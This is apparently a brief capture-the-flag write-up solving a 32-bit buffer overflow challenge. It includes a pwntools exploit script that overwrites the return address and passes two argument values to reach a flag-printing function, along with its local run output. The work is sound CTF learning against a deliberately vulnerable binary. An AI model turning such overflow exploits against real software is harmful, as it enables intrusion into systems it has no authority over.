Straight up buffer overflow with the twist of needing two parameters passed into the function.

This is my script to execute the buffer overflow:

```python
# Pass in pattern_size, get back EIP/RIP offset
offset = 44

# Start program
io = start()

# Build the payload
payload = flat(
    offset * b"A",
    p32(0x080491b6),
    p32(0x080492e0),
    p32(0xdeadbeef),
    p32(0xc0defeed)
)

write('payload', payload)

# Send the payload

io.sendafter(b'name:', payload)
# Got Shell?
io.interactive()
```

Running it locally (NOTE: I needed to hit return after it went interactive):

```sh
$ python3 solver.py
[+] Starting local process './youdontownme': pid 4177748
[*] Switching to interactive mode
 $

Wow! You do own me!  Have a Flag
